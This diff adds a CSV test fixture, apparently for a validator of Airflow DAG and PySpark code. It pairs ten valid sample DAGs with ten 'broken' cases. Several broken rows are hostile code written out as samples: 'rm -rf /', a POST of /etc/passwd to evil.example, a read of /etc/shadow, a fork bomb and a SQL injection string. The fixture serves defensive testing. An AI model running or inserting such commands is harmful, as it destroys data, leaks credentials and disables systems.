@@ -1,0 +1,109 @@
+id,expected,mutation_class,code
+VALID-01,valid,must pass syntax + reserialize,"from airflow import DAG
+from airflow.operators.bash import BashOperator
+from datetime import datetime
+with DAG('smoke', start_date=datetime(2026,1,1), schedule='@daily') as dag:
+    BashOperator(task_id='echo', bash_command='echo ok')
+"
+VALID-02,valid,must pass syntax + reserialize,"from airflow import DAG
+from airflow.operators.bash import BashOperator
+from datetime import datetime
+with DAG('smoke', start_date=datetime(2026,1,1), schedule='@daily') as dag:
+    BashOperator(task_id='echo', bash_command='echo ok')
+"
+VALID-03,valid,must pass syntax + reserialize,"from airflow import DAG
+from airflow.operators.bash import BashOperator
+from datetime import datetime
+with DAG('smoke', start_date=datetime(2026,1,1), schedule='@daily') as dag:
+    BashOperator(task_id='echo', bash_command='echo ok')
+"
+VALID-04,valid,must pass syntax + reserialize,"from airflow import DAG
+from airflow.operators.bash import BashOperator
+from datetime import datetime
+with DAG('smoke', start_date=datetime(2026,1,1), schedule='@daily') as dag:
+    BashOperator(task_id='echo', bash_command='echo ok')
+"
+VALID-05,valid,must pass syntax + reserialize,"from airflow import DAG
+from airflow.operators.bash import BashOperator
+from datetime import datetime
+with DAG('smoke', start_date=datetime(2026,1,1), schedule='@daily') as dag:
+    BashOperator(task_id='echo', bash_command='echo ok')
+"
+VALID-06,valid,must pass syntax + reserialize,"from airflow import DAG
+from airflow.operators.bash import BashOperator
+from datetime import datetime
+with DAG('smoke', start_date=datetime(2026,1,1), schedule='@daily') as dag:
+    BashOperator(task_id='echo', bash_command='echo ok')
+"
+VALID-07,valid,must pass syntax + reserialize,"from airflow import DAG
+from airflow.operators.bash import BashOperator
+from datetime import datetime
+with DAG('smoke', start_date=datetime(2026,1,1), schedule='@daily') as dag:
+    BashOperator(task_id='echo', bash_command='echo ok')
+"
+VALID-08,valid,must pass syntax + reserialize,"from airflow import DAG
+from airflow.operators.bash import BashOperator
+from datetime import datetime
+with DAG('smoke', start_date=datetime(2026,1,1), schedule='@daily') as dag:
+    BashOperator(task_id='echo', bash_command='echo ok')
+"
+VALID-09,valid,must pass syntax + reserialize,"from airflow import DAG
+from airflow.operators.bash import BashOperator
+from datetime import datetime
+with DAG('smoke', start_date=datetime(2026,1,1), schedule='@daily') as dag:
+    BashOperator(task_id='echo', bash_command='echo ok')
+"
+VALID-10,valid,must pass syntax + reserialize,"from airflow import DAG
+from airflow.operators.bash import BashOperator
+from datetime import datetime
+with DAG('smoke', start_date=datetime(2026,1,1), schedule='@daily') as dag:
+    BashOperator(task_id='echo', bash_command='echo ok')
+"
+BROKEN-01,broken,syntax_error,"from airflow import DAG
+with DAG('x' as dag:
+  pass
+"
+BROKEN-02,broken,cyclic_dependency,"from airflow import DAG
+from airflow.operators.bash import BashOperator
+from datetime import datetime
+with DAG('cyc', start_date=datetime(2026,1,1)) as d:
+  a=BashOperator(task_id='a',bash_command='x')
+  b=BashOperator(task_id='b',bash_command='y')
+  a >> b
+  b >> a
+"
+BROKEN-03,broken,undefined_name,"from airflow import DAG
+from datetime import datetime
+with DAG('x', start_date=datetime(2026,1,1)) as d:
+  result = undefined_fn()
+"
+BROKEN-04,broken,missing_required_arg,"from airflow import DAG
+with DAG() as d:
+  pass
+"
+BROKEN-05,broken,dangerous_command,"from airflow import DAG
+from airflow.operators.bash import BashOperator
+from datetime import datetime
+with DAG('bad', start_date=datetime(2026,1,1)) as d:
+  BashOperator(task_id='x', bash_command='rm -rf /')
+"
+BROKEN-06,broken,network_egress_in_spark,"import requests
+from pyspark.sql import SparkSession
+spark=SparkSession.builder.getOrCreate()
+requests.post('http://evil.example/leak', data=open('/etc/passwd').read())
+"
+BROKEN-07,broken,sensitive_path,"from pyspark.sql import SparkSession
+spark=SparkSession.builder.getOrCreate()
+df=spark.read.text('/etc/shadow')
+df.show()
+"
+BROKEN-08,broken,fork_bomb,"import os
+while True: os.fork()
+"
+BROKEN-09,broken,infinite_loop,"while True: pass
+"
+BROKEN-10,broken,sql_injection_in_code,"from pyspark.sql import SparkSession
+spark=SparkSession.builder.getOrCreate()
+uid='1; DROP TABLE users; --'
+spark.sql(f'SELECT * FROM users WHERE id={uid}')
+"
